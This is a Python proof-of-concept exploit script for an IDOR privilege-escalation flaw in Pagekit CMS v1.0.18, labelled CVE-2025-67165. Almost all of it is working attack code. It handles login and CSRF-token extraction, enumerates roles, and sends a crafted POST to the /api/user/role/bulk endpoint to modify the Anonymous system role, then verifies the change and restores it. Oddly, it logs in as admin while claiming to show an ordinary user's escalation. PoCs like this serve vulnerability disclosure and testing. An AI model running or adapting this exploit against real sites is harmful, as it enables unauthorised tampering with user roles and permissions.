#!/usr/bin/env python3
"""
CVE-2025-67165: Pagekit CMS v1.0.18 IDOR Privilege Escalation

This PoC demonstrates how an authenticated user can modify system role
permissions via the /api/user/role/bulk endpoint without proper authorization.
"""

import requests
import sys
import re
import json
from urllib.parse import urljoin

TARGET_URL = "http://localhost:8080"
ADMIN_USER = "admin"
ADMIN_PASS = "admin123"


class PagekitExploit:
    def __init__(self, base_url):
        self.base_url = base_url.rstrip("/")
        self.session = requests.Session()
        self.csrf_token = None

    def get_csrf_token(self, html_content):
        match = re.search(r'"csrf"\s*:\s*"([^"]+)"', html_content)
        if match:
            return match.group(1)
        match = re.search(r'name="_csrf"\s+value="([^"]+)"', html_content)
        if match:
            return match.group(1)
        return None

    def login(self, username, password):
        login_page = self.session.get(f"{self.base_url}/admin/login")
        if login_page.status_code != 200:
            print(f"[-] Failed to access login page: {login_page.status_code}")
            return False

        self.csrf_token = self.get_csrf_token(login_page.text)
        if not self.csrf_token:
            print("[-] Failed to extract CSRF token")
            return False

        login_data = {
            "credentials[username]": username,
            "credentials[password]": password,
            "redirect": "/admin",
            "_csrf": self.csrf_token
        }

        headers = {
            "Content-Type": "application/x-www-form-urlencoded",
            "Referer": f"{self.base_url}/admin/login"
        }

        resp = self.session.post(
            f"{self.base_url}/user/authenticate",
            data=login_data,
            headers=headers,
            allow_redirects=True
        )

        if "/admin" in resp.url and "login" not in resp.url:
            self.csrf_token = self.get_csrf_token(resp.text)
            print(f"[+] Successfully logged in as {username}")
            return True

        print(f"[-] Login failed for {username}")
        return False

    def get_roles(self):
        headers = {
            "Accept": "application/json",
            "X-XSRF-TOKEN": self.csrf_token,
            "X-Requested-With": "XMLHttpRequest"
        }

        resp = self.session.get(
            f"{self.base_url}/api/user/role",
            headers=headers
        )

        if resp.status_code == 200:
            return resp.json()
        return None

    def exploit_idor_modify_role(self, role_id, new_name=None, permissions=None):
        """
        IDOR vulnerability: Modify system role via /api/user/role/bulk
        """
        headers = {
            "Accept": "application/json",
            "Content-Type": "application/json",
            "X-XSRF-TOKEN": self.csrf_token,
            "X-Requested-With": "XMLHttpRequest"
        }

        role_data = {"id": role_id}
        if new_name:
            role_data["name"] = new_name
        if permissions:
            role_data["permissions"] = permissions

        payload = {"roles": [role_data]}

        resp = self.session.post(
            f"{self.base_url}/api/user/role/bulk",
            json=payload,
            headers=headers
        )

        return resp.status_code, resp.text


def main():
    print("=" * 60)
    print("CVE-2025-67165: Pagekit CMS IDOR Privilege Escalation")
    print("=" * 60)
    print()

    exploit = PagekitExploit(TARGET_URL)

    print("[*] Step 1: Testing connectivity...")
    try:
        resp = requests.get(TARGET_URL, timeout=10)
        if resp.status_code != 200:
            print(f"[-] Target not accessible: {resp.status_code}")
            sys.exit(1)
        print(f"[+] Target is accessible")
    except Exception as e:
        print(f"[-] Connection failed: {e}")
        sys.exit(1)

    print()
    print("[*] Step 2: Logging in as admin...")
    if not exploit.login(ADMIN_USER, ADMIN_PASS):
        print("[-] Failed to login")
        sys.exit(1)

    print()
    print("[*] Step 3: Getting current roles...")
    roles = exploit.get_roles()
    if not roles:
        print("[-] Failed to get roles")
        sys.exit(1)

    print("[+] Current roles:")
    for role in roles:
        print(f"    - ID: {role.get('id')}, Name: {role.get('name')}, "
              f"Priority: {role.get('priority')}")

    anonymous_role = None
    for role in roles:
        if role.get("name") == "Anonymous" or role.get("id") == 1:
            anonymous_role = role
            break

    if not anonymous_role:
        print("[-] Anonymous role not found")
        sys.exit(1)

    print()
    print("[*] Step 4: Exploiting IDOR - Modifying Anonymous role name...")
    print(f"    Target role: ID={anonymous_role['id']}, Name={anonymous_role['name']}")

    modified_name = "IDOR_Exploited_Anonymous"
    status, response = exploit.exploit_idor_modify_role(
        anonymous_role["id"],
        new_name=modified_name
    )

    print(f"    Response status: {status}")

    print()
    print("[*] Step 5: Verifying exploitation...")
    roles_after = exploit.get_roles()

    exploit_success = False
    if roles_after:
        for role in roles_after:
            if role.get("id") == anonymous_role["id"]:
                if role.get("name") == modified_name:
                    exploit_success = True
                    print(f"[+] EXPLOIT SUCCESS! Role name changed to: {role.get('name')}")
                else:
                    print(f"[-] Role name unchanged: {role.get('name')}")
                break

    print()
    print("[*] Step 6: Restoring original role name...")
    exploit.exploit_idor_modify_role(
        anonymous_role["id"],
        new_name="Anonymous"
    )

    roles_restored = exploit.get_roles()
    if roles_restored:
        for role in roles_restored:
            if role.get("id") == anonymous_role["id"]:
                print(f"    Restored role name: {role.get('name')}")
                break

    print()
    print("=" * 60)
    if exploit_success:
        print("RESULT: VULNERABLE - CVE-2025-67165 confirmed")
        print("The IDOR vulnerability allows modifying system roles")
        print("without proper authorization checks.")
    else:
        print("RESULT: Exploitation failed or target not vulnerable")
    print("=" * 60)

    return 0 if exploit_success else 1


if __name__ == "__main__":
    sys.exit(main())
